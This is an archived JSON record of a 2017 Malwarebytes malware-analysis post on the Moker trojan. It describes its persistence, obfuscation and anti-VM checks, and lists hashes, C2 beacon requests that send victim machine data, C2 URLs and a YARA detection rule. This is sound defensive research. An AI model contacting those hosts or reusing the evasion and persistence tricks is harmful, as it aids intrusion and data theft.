{
    "id": "0305b0ea-d32b-4a15-b9f8-e7874959b98b",
    "created_at": "2023-01-12T14:59:56.966574Z",
    "updated_at": "2025-03-27T02:06:13.792226Z",
    "deleted_at": null,
    "sha1_hash": "959db7919bb952cf70c70d1c394aeb0e0822deb5",
    "title": "2017-04-21 - Elusive Moker Trojan is back",
    "authors": "",
    "file_creation_date": "2022-05-28T04:56:31Z",
    "file_modification_date": "2022-05-28T04:56:31Z",
    "file_size": 878554,
    "plain_text": "# Elusive Moker Trojan is back\n\n**[blog.malwarebytes.com/threat-analysis/2017/04/elusive-moker-trojan/](https://blog.malwarebytes.com/threat-analysis/2017/04/elusive-moker-trojan/)**\n\nMalwarebytes Labs April 21, 2017\n\n**_[UPDATE: This trojan is also known under the names Yebot and Tilon. According to Dr Web,](https://vms.drweb.com/virus/?i=4357803)_**\n_this family is in circulation from at least 2012. It was first described under the name Moker by_\n_[Ensilo, in 2015. //thanks to](http://blog.ensilo.com/moker-a-new-apt-discovered-within-a-sensitive-network)_ _[@kafeine for the tip](https://twitter.com/kafeine)_\n\nSome time ago we observed a rare, interesting malware dropped from the Rig-v EK. Its code\nwas depicting that it is written by professionals. Research has shown that it is a sample of\n[Moker Trojan (read more here). However, for a long time, we could not find a sample with](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/troj_moker.a)\nworking CnC in order to do a deeper research. Finally, we found such a sample – this article\nwill be a deep dive in its capabilities.\n\n## Analyzed samples\n\n**[76987e1882ef27faab675c4a5ce4248d – main sample – dropped by EK (April 2017)](https://www.hybrid-analysis.com/sample/af1bd82bf11e5a386abf5e1a1dc9773b66f7936f6e2e8f3ea4cc913794bf5a81?environmentId=100)**\n\n**[f961bf2d0504e376b3305e9d06f66de3 – the main module – DLL (stage 2)](https://virustotal.com/en/file/845992942501fe6fbb15df8392168d09f42e320f316c9649a914ec8b9c3b80ec/analysis/1491692602/)**\n[e63913d6d389a6bc5f2aa4036717ac27 – main sample (dropped by EK)](https://virustotal.com/en/file/164222d29856cba2d913e48ee36ef0d7b2fde943d7369437106317e4252f124c/analysis/)\n\n4d9f5048e225e8b4dd5feb8ec489e483 – unpacked payload (stage 1)\n\nDownloaded modules:\n\n[8997b9365c697e757f5a4717ec36fb2d – pluginj382dew1i.exe](https://virustotal.com/en/file/2f41e714f582af5d044a3a88cd1d3f3cda0478fe1740769ca85b868490d74c77/analysis/1492036617/)\n\n\n-----\n\n[faf2135dc5311b034d31191694a52bbd – KB1080030.exe](https://virustotal.com/en/file/4f674aef65836687b29635c01457c18d0ef87c2b4218a5ed88275dfa2ef0054f/analysis/1492036461/)\n\nReference samples (from 2015)\n\n[9bdd2e72708584c9fd6761252c9b0fb8 – sample #1](https://www.hybrid-analysis.com/sample/c6eef5fcccef671bbc6af65983974af14b1243edad0f73b45924aff4b19fe115?environmentId=1)\n\n## Distribution method\n\nWe found Moker Trojan distributed via exploit kits – in malvertising campaigns, as well as\ndropped from the hacked sites. Example – Rig-v EK dropping Moker:\n\n## Behavioral analysis\n\nThe malware injects itself into the svchost, and then contacts the CnC server.\n\n**Network communication**\n\nThe communication is encrypted. The typical way of beaconing is to send the request to the\naddress: <gate_name>.php?img=<number>\n\nAn example of the sent request:\n```\nGET /nnnn04722.php?img=1 HTTP/1.1\nUser-Agent: Mozilla\nHost: bitmixc.ml\n\n```\n\n-----\n\nThe server responds with encrypted content (the bot saves it in a registry key). Then it injects\nitself in other applications and sends further requests, including the data of the infected\nmachine, i.e.:\n```\nGET /nnnn04722.php?page=<computername><windows_version>_<disk_id>&s=<number>p=\n<number>.<number>&err=<number>.<number>\n\n```\n\n-----\n\nIn the below case, the response turned out to be a PE file (an updated version of the bot)\nobfuscated by XOR with a character ‘c’.\n\nThe server responds either by sending some encrypted content or a number:\n```\n=<number>\n\n```\n\n-----\n\n**Persistence**\n\nMoker achieves its persistence by adding a Run key in the registry. This method may look\nvery simple at first. However, the authors of the malware hid the real executable behind a\nlegitimate Microsoft application – Rundl32.exe. Thanks to this trick, it is much harder to\nnotice it – a popular tool used to examine persistent applications, Sysinternals’ autoruns,\ndoes not show such keys by default, assuming that they are harmless. (Viewing them can be\nenabled by clearing the default option “Hide Windows Entries”.)\n\nThe sample of Moker is dropped in the current user’s home directory:\n\n\n-----\n\nIf we take a closer look at the sample, we can see that it has been slightly modified in\ncomparison to the original one – some encrypted information has been removed:\n\nAs it turned out after the further research (see in the part “Inside”), those bytes contains the\nCnC address, prefixed by a special tag. The information removed from the executable is not\nlost but stored elsewhere – in one of the registry keys created for storing the malware\nconfiguration.\n\nOther keys created by the malware are saved under “..\\CLSID\\{448D3B34-8D3B-3B34_8D3B-48D3448D3B34}”:_\n\n[The full dump of the registry entries is available here.](https://gist.githubusercontent.com/hasherezade/40157ab29c6b1001855a0589b1d5369a/raw/5987889557e092a8c35653881e2a78d940102d24/moker.reg)\n\nAs it turned out, the encrypted CnC address, that was removed from the executable, is\npersisted in the registry, inside the key “5”:\n\n\n-----\n\nCompare with the data from inside the original sample:\n\nAnother key, “6”, stores a PE file (the executable dumped from the registry is available here:\n[91f754c3fc475aed93e80575bb503c73).](https://virustotal.com/en/file/aec046984fd89902559db13fe1e2fab4c5a4c969eed6b6e59d617d109eed3ec9/analysis/1491351756/)\n\nThe key “7” stores the data that was downloaded from the CnC after the initial beacon:\n\n\n-----\n\nCompare with the content of the server response:\n\n\n-----\n\nThe key “10” contains the name of the downloaded module:\n\nThe new module is stored in ProgramData:\n\n\n-----\n\nIts persistence is added also with the help of a Run key (in a similar way as the previously\ndescribed case):\n\n## Inside\n\nMoker consists of two main modules. The Stage 1, that is a downloader, and the Stage 2,\nthat is a DLL containing the core malicious features. The downloader injects itself, along with\nthe unpacked shellcode, into the svchost.exe. The screenshot below shows an example of\nthe infected memory pages inside the svchost.exe:\n\n\n-----\n\nThe injected shellcode is responsible for sending the initial beacon to the CnC. Then, if the\nCnC is active, the main DLL is downloaded and injected into the other processes. During the\ntests, all 32-bit applications running in the Medium integrity mode have been infected by the\nMoker DLL.\n\n**Stage 1**\n\nLet’s dive in the code, starting from the dropper – that is the Stage 1. This is the binary used\nfor initiating the full infection process – originally delivered by exploit kits. Every sample\ncomes packed by some crypter (crypters are different for various samples so we will not\ndescribe this layer here).\n\nAfter defeating a stub of a crypter, we get another PE file – with a layout typical for Moker.\nThe section .text, that – in normal cases is the first section of PE, in case of Moker comes as\nsecond:\n\n\n-----\n\nSection .data is very small in the raw file, but it is expanding in the virtual image. So, we can\nsuspect that something more is unpacked there:\n\nObfuscated execution flow\n\nThe internal structure of this module is very interesting. It has self-modifying code with\nexecution based on VEH (Vectored Exception Handers). Execution starts from installing the\nhandler:\n\n\n-----\n\nInstructions IN are used in various places in the code. Their role is to disrupt the continuity of\nthe execution by triggering an exception. Then, execution is redirected to the previously\ninstalled handler. Depending on the variant of the instruction that triggered the exception, the\ncontext is changed in one of the few ways:\n\nContext patching is used to obfuscate the execution flow. Thanks to this trick, static analysis\nof the code is almost impossible – all changes on the fly.\n\nThe JMP EAX (first case in the exception handler) is used to deploy API calls. It is triggered\nby IN AL, <BYTE> (see the example below):\n\n\n-----\n\nThat’s why, if we trace the API calls made by the application, we can notice that most of them\nare made from the same address in the code – only the target address is changing.\n\nNot only the execution flow but also the code itself is dynamically modified. We can find the\napplication calling very often VirtualAlloc:\n\nSome pieces of the encrypted code are copied from the main executable into this\ndynamically allocated memory:\n\n\n-----\n\nThen, they are decrypted by a dedicated function:\n\nThe revealed code is almost ready – except for the addresses of calls, that needs to be filled.\nYou can see in the following fragment, that temporarily the CALL points to its own address:\n\n\n-----\n\nThis is fixed in another step – the decoding function returns into another code fragment, that\nmodifies the addresses:\n\nTill the new piece of code is fully revealed and ready to be called (see the fixed CALL target):\n\nWhen the modifying function returns, execution falls into the line that performs a jump into\nthe new code:\n\nThe revealed code makes another layer – again allocating, decrypting and calling code.\n\n\n-----\n\nThe code chunks that provide some real functionality are always deployed via this type of\nproxy – that makes execution flow more complicated.\n\nFunctionality\n\nThe dropper starts execution from the defensive checks, ensuring that it is not run in the\ncontrolled environment. The following registry keys are searched:\n```\n\"HKEY_LOCAL_MACHINE\\\\HARDWARE\\\\ACPI\\\\DSDT\\\\VBOX__\"\n\"HKEY_CURRENT_USER\\\\Software\\\\Trusteer\\\\Rapport\"\n\"HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\"\n-> SysAnalyzer\n\n```\n\n-----\n\nIf all the checks passed, the application reads it s own file from the disk and searches there\nfor some typical markers. An example of the search:\n\nThe important thing is, those markers are present in the outermost layer – the original PE file\n(not the unpacked one). Thanks to this feature, knowing them allowed to create a very\nsimple YARA rule to identify Moker:\n```\nrule MokerTrojan\n{\nstrings:\n $key = {3D FF 24 8B 92 C1 D6 9D}\ncondition: \n IsPE and\n all of them\n}\n\n```\nThe mentioned markers are used as indicators, after which the encrypted CnC address is\nstored.\n\nAnother feature, typical for Moker is mutex in the following format:\n```\n\"Global\\\\a0bp-<Machine_ID>\"\n\n```\nThe mutex prevents the application from being run more than once.\n\nAfter the environment checks are passed, Moker unpacks the shellcode, that has capabilities\nof a downloader, and injects it (along with the initial PE file) into svchost.\n\n**Stage 2**\n\nIf the main DLL was successfully downloaded by the Stage 1, it is being further injected in\nthe applications. Example – Moker DLL injected into jusched (Java Update Scheduler):\n\n\n-----\n\nThis module is responsible for all the malicious actions performed by the malware – also, it\nactively communicates with its CnC. Below you can see a sample POST request sent from\ninside the injected DLL:\n\nIf we try to dump the injected DLL, we can see, that it’s imported table has been destroyed –\nall the names of the DLLs and imported functions are erased. However, using a dedicated\ntool I was able to recover it (see more [here).](https://www.youtube.com/watch?v=FRn121kK92E)\n\nThe DLL provides various features typical for RAT (they didn’t chang from the latest analysis\n[in 2015, provided here).](https://breakingmalware.com/malware/moker-part-2-capabilities/)\n\n\n-----\n\nCode of the core DLL is written in a decent way, suggesting professionalism of the authors.\nHowever in contrary to the dropper, the obfuscation used here is rather simple. Most of the\nstrings and API calls are not obfuscated, or obfuscated in a trivial way.\n\nLooking inside the code, we can see references to the registry keys, observed during\nbehavioral analysis, i.e.:\n\nThe DLL communicates not only with the CnC, but also with it’s other injected modules,\nusing local sockets and named pipes. An example below – starting a local socket for\nlistening:\n\n\n-----\n\nThe commands read from the ipe are parsed and executed:\n\nBasing on the command id, malware can be requested over pipe to execute some command\nor to create and save a screenshot:\n\n\n-----\n\nAmong the interesting features of this part is, it also provides access to it’s features via\nsimple GUI. It may be used for local tests, or. in case if the attackers prefer to access the\nvictim machine via Remote Desktop.\n\n## CnC servers\n\nList of the found CnC servers (one address per one sample):\n```\nhttp://bitmixc.ml/nnnn04722.php\nhttp://bitmixc.ml/msnwiwoq25.php\nhttp://matthi.tk/abb6a388.php\nhttp://sally33.cf/23mmmdw3.php\nhttp://siri5.ml/www9.php\n\n## Conclusion\n\n```\nMoker is a rare malware, but written by very skilled authors. Compilation timestamp of the\ncore module is 2015-05-03 00:40:11. This suggests that since its moment of appearance, still\nthe same samples are in circulation, only they are repacked by different packers. This fact\nleads us to the conclusion that the tool have been produced and sold on black market in\n2015, after that possibly abandoned by the original developers.\n\n\n-----\n\n## Appendix\n\n[http://blog.ensilo.com/moker-a-new-apt-discovered-within-a-sensitive-network – Ensilo on](http://blog.ensilo.com/moker-a-new-apt-discovered-within-a-sensitive-network)\nMoker (from 2015)\n\nhttps://breakingmalware.com/malware/moker-part-1-dissecting-a-new-apt-under-themicroscope/ – part 1\n\n[https://breakingmalware.com/malware/moker-part-2-capabilities/ – part 2](https://breakingmalware.com/malware/moker-part-2-capabilities/)\n\nhttp://www.msreverseengineering.com/blog/2015/6/29/transparent-deobfuscation-with-idaprocessor-module-extensions – deobfuscating Yebot\n\n_This was a guest post written by Hasherezade, an independent researcher and programmer_\n_with a strong interest in InfoSec. She loves going in details about malware and sharing threat_\n_[information with the community. Check her out on Twitter @hasherezade and her personal](https://twitter.com/hasherezade)_\n_[blog: https://hshrzd.wordpress.com.](https://hshrzd.wordpress.com/)_\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-04-21 - Elusive Moker Trojan is back.pdf"
    ],
    "report_names": [
        "2017-04-21 - Elusive Moker Trojan is back.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535596,
    "ts_updated_at": 1743041173,
    "ts_creation_date": 1653713791,
    "ts_modification_date": 1653713791,
    "files": {
        "pdf": "https://archive.orkl.eu/959db7919bb952cf70c70d1c394aeb0e0822deb5.pdf",
        "text": "https://archive.orkl.eu/959db7919bb952cf70c70d1c394aeb0e0822deb5.txt",
        "img": "https://archive.orkl.eu/959db7919bb952cf70c70d1c394aeb0e0822deb5.jpg"
    }
}